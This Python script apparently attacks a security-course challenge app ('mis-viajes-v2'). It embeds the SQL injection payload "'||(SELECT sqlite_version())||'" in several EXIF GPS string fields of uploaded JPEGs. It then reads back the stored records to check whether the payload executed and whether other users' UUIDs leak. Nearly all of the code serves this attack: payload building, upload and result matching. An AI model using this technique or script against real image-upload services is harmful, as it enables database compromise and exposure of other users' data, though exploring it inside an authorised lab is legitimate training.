# gps_piexif.py — exiftool won't write malformed GPS, but piexif writes ARBITRARY rationals.
# The server converts deg/min/sec rationals to a decimal latitude. Probe how that conversion
# behaves and whether the raw GPS strings (Ref, or the rationals) reach the SQL unsanitized.
# Also test GPSLatitudeRef / GPSMapDatum / GPSProcessingMethod which are STRING GPS fields.
from PIL import Image
import piexif, base64, requests, re

BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"
base_img = Image.open("paisaje.png").convert("RGB")
verre = re.compile(r"3\.\d+\.\d+")
UURE  = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")

def send(gps_extra, desc):
    base_img.save("gp.jpg","jpeg",quality=85)
    def dms(x):
        dd=int(x); m=int((x-dd)*60); s=round((x-dd-m/60)*3600,4); return ((dd,1),(m,1),(int(s*100),100))
    gps = {piexif.GPSIFD.GPSLatitudeRef:b"S", piexif.GPSIFD.GPSLatitude:dms(41.13),
           piexif.GPSIFD.GPSLongitudeRef:b"W", piexif.GPSIFD.GPSLongitude:dms(71.31)}
    gps.update(gps_extra)
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':gps}
    piexif.insert(piexif.dump(ex),"gp.jpg")
    uri="data:image/jpeg;base64,"+base64.b64encode(open("gp.jpg","rb").read()).decode()
    r=requests.post(f"{BASE}/upload", json={"image":uri,"description":desc,"user_id":UID})
    return r.status_code

P=b"'||(SELECT sqlite_version())||'"
tests = [
    ("gps_ref_payload",   {piexif.GPSIFD.GPSLatitudeRef: P}),          # STRING field: Ref
    ("gps_mapdatum",      {piexif.GPSIFD.GPSMapDatum: P}),             # STRING field
    ("gps_procmethod",    {piexif.GPSIFD.GPSProcessingMethod: P}),     # STRING field
    ("gps_areainfo",      {piexif.GPSIFD.GPSAreaInformation: P}),      # STRING field
    ("gps_datestamp",     {piexif.GPSIFD.GPSDateStamp: P}),            # STRING field
]
for desc, extra in tests:
    sc = send(extra, desc)
    print(f"{desc:18} -> {sc}")

print("\n--- readback ---")
data = requests.get(f"{BASE}/images/{UID}").json()
descs = {t[0] for t in tests}
for img in data:
    if img.get("description") in descs:
        flds={k:img.get(k) for k in ("make","model","datetime","summary_ocr","latitude","longitude")}
        hit = any(verre.search(str(v)) for v in flds.values())
        leak= [u for v in flds.values() for u in UURE.findall(str(v)) if u!=UID]
        print(f"{img['description']:18} {flds}" + ("  <<< EXEC" if hit else "") + (f"  <<< UUID {leak}" if leak else ""))
